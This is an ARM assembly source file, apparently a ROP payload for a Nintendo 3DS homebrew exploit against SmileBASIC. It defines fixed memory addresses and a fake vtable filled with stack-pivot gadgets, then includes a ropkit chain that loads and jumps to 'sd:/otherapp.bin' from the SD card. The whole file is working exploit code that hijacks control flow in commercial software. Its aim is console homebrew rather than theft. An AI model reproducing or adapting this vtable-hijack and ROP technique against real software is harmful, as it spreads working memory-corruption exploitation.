	.arm
	.text


#include "defines.h"


#define GARBAGE 0xdeadb0b0  

#define ROPBUF 0x00480000     //bss location of rop payload (ropkit_boototherapp.s) that launches otherapp
#define ROPKIT_LINEARMEM_REGIONBASE 0x30000000
#define ROPKIT_LINEARMEM_BUF (ROPKIT_LINEARMEM_REGIONBASE+0x0100000)
//#define ROPKIT_BINLOAD_ADDR ROPKIT_LINEARMEM_REGIONBASE+0x6190000
//#define ROPKIT_BINLOAD_ADDR ROPKIT_LINEARMEM_REGIONBASE+0x2598000
#define ROPKIT_BINLOAD_ADDR ROPKIT_LINEARMEM_BUF-0x10000

#define ROPKIT_BINPAYLOAD_PATH "sd:/otherapp.bin"
//#define ROPKIT_MOUNTSD        //3.6.0 smilebasic added Direct SDMC. this is a good thing.
#define ROPKIT_TMPDATA 0x0FFFC000
#define ROPKIT_BINLOAD_TEXTOFFSET 0x1000
//#define ROPKIT_ENABLETERMINATE_GSPTHREAD
#define ROPKIT_BEFOREJUMP_CACHEBUFADDR 0x30100000
#define ROPKIT_BEFOREJUMP_CACHEBUFSIZE 0x504000  //large gsgpu flush fixes our new3ds L2 cache issues - and increases stability for old3ds
                                                 //smilebasic is VERY picky about this gpu flush; cant deviate very much from the given size or address without serious bootrate drop.

#include "ropkit_ropinclude.s"

_start:
ropstackstart:

#include "ropkit_boototherapp.s"   //let yls8 voodoo code do its work :3

.word 4
.word 8
.word 12
pivot_regstore:
.word 16

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, STACK_PIVOT @ Vtable